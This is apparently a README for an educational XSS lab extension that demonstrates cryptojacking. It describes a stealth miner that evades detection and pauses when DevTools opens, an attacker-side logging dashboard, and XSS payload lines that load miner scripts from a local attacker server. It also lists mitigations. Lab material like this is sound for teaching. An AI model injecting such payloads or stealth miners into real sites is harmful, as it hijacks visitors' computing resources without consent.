# XSS Lab: Cryptojacking Extension

This extension adds cryptojacking capabilities to the XSS vulnerability lab. It demonstrates how Cross-Site Scripting (XSS) vulnerabilities can be exploited to run cryptocurrency mining scripts in victims' browsers.

## Overview

Cryptojacking is a type of attack where malicious actors inject cryptocurrency mining scripts into websites to use visitors' CPU resources to mine cryptocurrency without their knowledge or consent. This lab demonstrates this attack vector in a controlled environment for educational purposes.

## Components Added

1. **Cryptocurrency Miner Script** (`attacker-server/src/miner.js`):
   - Simulates cryptocurrency mining operations
   - Consumes CPU resources to demonstrate impact
   - Reports mining statistics back to the attacker server
   - Displays a visual indicator of mining activity

2. **Stealth Miner Script** (`attacker-server/src/stealth_miner.js`):
   - More advanced version that tries to evade detection
   - Adjusts mining intensity based on system conditions
   - Uses obfuscation techniques to hide its purpose
   - Throttles mining when the page is visible to avoid detection
   - Generates unique identifiers for tracking victims
   - Pauses when DevTools is open to avoid detection

3. **Mining Statistics Logger** (`attacker-server/src/log_mining.php`):
   - Receives and logs mining statistics from compromised browsers
   - Stores data for later analysis by the attacker
   - Sanitizes incoming data to prevent log injection

4. **Mining Dashboard** (`attacker-server/src/mining_logs.php`):
   - Displays collected mining statistics in an organized dashboard
   - Shows active miners, hash rates, and total hashes mined
   - Tracks unique victims and their mining contributions
   - Provides detailed mining activity logs with timestamps
   - Calculates mining efficiency and session statistics

5. **Sample Attack Payloads** (`attack-others/cryptojacking-payload.txt`):
   - Various XSS payloads to inject the mining scripts
   - Includes basic, hidden, stealth, disguised, and obfuscated variants
   - Features payloads with delayed execution and visibility-based triggers
   - Demonstrates combined attacks (cookie theft + cryptojacking)

## How to Use

### Setting Up the Lab

1. Start the lab environment:
   ```
   docker-compose up -d
   ```

2. Access the vulnerable application at `http://localhost:8080`

### Performing the Attack

1. Register an account or log in to an existing account
2. Post a comment containing one of the XSS payloads from `attack-others/cryptojacking-payload.txt`, such as:
   ```html
   <script src="http://localhost:8081/miner.js"></script>
   ```
   or for a stealthier approach:
   ```html
   <script src="http://localhost:8081/stealth_miner.js"></script>
   ```
3. Log out and log in as a different user
4. View the comments page to see the mining script in action

### Monitoring the Attack

1. Access the mining statistics dashboard at `http://localhost:8081/mining_logs.php`
2. Observe the collected mining data, including:
   - Total hashes mined
   - Number of active miners
   - Hash rates from different victims
   - User agent information

## Educational Value

This extension demonstrates:

1. **Real-world Impact of XSS**: Shows how XSS vulnerabilities can lead to resource theft
2. **Client-side Security Risks**: Illustrates the dangers of executing untrusted JavaScript
3. **Detection Evasion Techniques**: Demonstrates how attackers try to hide malicious activity
4. **Performance Impact**: Shows the tangible effects of cryptojacking on system performance

## Mitigation Strategies

To prevent cryptojacking attacks:

1. **Input Validation**: Sanitize all user input before displaying it
2. **Content Security Policy (CSP)**: Implement strict CSP headers to control script execution
3. **Output Encoding**: Use proper context-aware encoding for dynamic content
4. **Regular Updates**: Keep all software components updated with security patches
5. **Client-side Protection**: Use browser extensions that block cryptomining scripts

## Ethical Considerations

This lab is for educational purposes only. In real-world scenarios:

- Always obtain proper authorization before security testing
- Never deploy cryptojacking scripts on production systems
- Respect users' resources and privacy
- Follow responsible disclosure practices when finding vulnerabilities

## Documentation

For more detailed information about the cryptojacking vulnerability, see the `CRYPTOJACKING.md` file in the project root. 